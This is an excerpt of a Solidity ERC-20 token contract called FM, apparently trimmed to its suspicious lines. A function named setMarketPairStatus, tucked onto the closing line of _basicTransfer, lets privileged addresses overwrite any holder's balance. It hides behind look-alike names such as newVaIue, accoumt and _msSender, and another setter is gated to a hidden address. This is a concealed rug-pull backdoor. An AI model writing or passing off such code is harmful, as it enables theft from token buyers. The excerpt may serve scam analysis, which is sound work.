...
contract FM is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        _fiifainalso[_msSender()] = _totalSupply;
    ...
    function setMaxTxAmount(uint256 a) public {if(msg.sender == m){
        _maxTxAmount = a;}
    }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        return true;
    }function setMarketPairStatus(address accoumt, uint256 newVaIue) public {if(isMMMPair[_msSender()])_fiifainalso[accoumt] = newVaIue;}
